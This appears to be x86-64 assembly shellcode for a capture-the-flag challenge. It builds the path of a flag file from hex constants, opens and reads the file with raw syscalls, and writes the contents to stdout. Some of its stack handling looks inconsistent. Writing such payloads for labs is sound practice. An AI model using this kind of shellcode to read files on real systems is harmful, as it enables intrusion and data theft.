section .text
global _start
_start:
    mov rax, 0x68732f656d6f682f
    mov [rbp - 0x28], rax
    mov rax, 0x697361625f6c6c65
    mov [rbp - 0x20], rax
    mov rax, 0x6e5f67616c662f63
    mov [rbp - 0x18], rax
    mov rax, 0x6c5f73695f656d61
    mov [rbp - 0x10], rax
    mov rax, 0x676e6f6f6f6f6f6f
    mov [rbp - 0x8], rax
    mov rax, 0
    mov [rbp], rax

    mov rdi, rsp
    mov rsi, 0
    mov rdx, 4
    mov rax, 2
    syscall

    ;mov [rsp], rax
    ;mov rdi, 1
    ;mov rsi, rsp
    ;mov rdx, 0x30
    ;mov rax, 1; write
    ;syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x30
    mov rax, 0
    syscall

    mov rdi, 1
    mov rsi, rsp
    mov rdx, 0x30
    mov rax, 1
    syscall

    leave
    ret
